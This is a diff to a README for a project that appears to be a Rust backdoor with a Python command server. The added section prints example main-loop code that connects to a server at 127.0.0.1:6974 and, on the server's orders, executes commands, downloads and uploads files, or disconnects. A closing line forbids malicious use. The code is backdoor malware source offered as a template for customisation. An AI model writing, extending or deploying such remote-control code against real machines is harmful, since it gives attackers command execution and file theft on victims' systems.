@@ -17,7 +17,65 @@ This project stems from my interest in protocols and security, leading to the cr
 
 ### Backdoor
 
-The backdoor is divided into four files, each responsible for specific functionalities:
+This project currently performs only basic functionalities.
+However, if you wish to customize this project, please read the following guidelines. Below is an example code:
+
+```
+mod exploits;
+mod stprotocol;
+mod structure;
+
+use exploits::{Exploits, Malware};
+use std::thread;
+use stprotocol::{Client, Session};
+use structure::{Detector, Generator, StoneTransferProtocol, StructStone};
+
+fn main() {
+    let handle_server = thread::spawn(|| {
+        event_loop(
+            Session::new("127.0.0.1:6974".to_string()),
+            StructStone::default(),
+        )
+    });
+
+    handle_server
+        .join()
+        .expect("Connection to server is lost for unknown reasons. Backdoor terminated.");
+}
+
+fn event_loop(mut client: Session, mut packet: StructStone) {
+    let mut exploit = Exploits::default();
+    loop {
+        // Loop for continuous communication with the server after creating a session
+
+        packet = client.receiving(StructStone::default()); // Wait for the server's response after connection request
+
+        println!("Server response type: {:?}", packet.get_type());
+
+        match packet.get_type() {
+            // Generate requests based on the server's response type
+            StoneTransferProtocol::ExecuteCmd => {
+                // If the type is ExecuteCmd
+                client.exploit(exploit.command(packet));
+            }
+            StoneTransferProtocol::Download => {
+                // If the type is Download
+                client.download(packet);
+            }
+            StoneTransferProtocol::Upload => {
+                // If the type is Upload
+                client.upload(packet);
+            }
+            StoneTransferProtocol::Disconnect => {
+                client.disconnect();
+                break;
+            } // If the server's response is Disconnect, terminate the connection
+
+            _ => client.send(packet.get_stone()), // If the response type is not mentioned above, send a request similar to the server's response
+        };
+    }
+}
+```
 
 1. **main.rs:** Contains the core functionalities of the backdoor.
 2. **exploits.rs:** Manages the implementation of backdoor exploits.
@@ -26,14 +84,11 @@ The backdoor is divided into four files, each responsible for specific functiona
 
 ### Customization
 
-If you wish to customize the backdoor, follow these guidelines:
+If you wish to customize this project, you can modify the code in the respective files: exploits.rs, stprotocol.rs, and structure.rs. Follow the provided comments for guidance.
 
-1. Open the relevant file for customization:
-   - `exploits.rs` for exploit customization.
-   - `stprotocol.rs` for protocol customization.
-   - `structure.rs` for packet structure customization.
+Feel free to tailor the code to your specific requirements and functionalities. Remember to consider security implications and best practices when making changes.
 
-2. Make your desired modifications.
+Note: Ensure that your modifications comply with ethical standards and legal regulations. Unauthorized use of this code for malicious purposes is strictly prohibited.
 
 ## Python Server
 
